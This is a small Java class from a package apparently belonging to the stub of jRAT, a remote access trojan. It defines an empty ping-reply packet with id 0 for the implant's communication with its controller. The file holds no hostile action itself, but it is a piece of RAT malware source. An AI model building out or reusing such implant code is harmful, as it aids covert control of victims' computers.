package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;

public class Packet0PingReply extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return (byte) 0;
	}

}
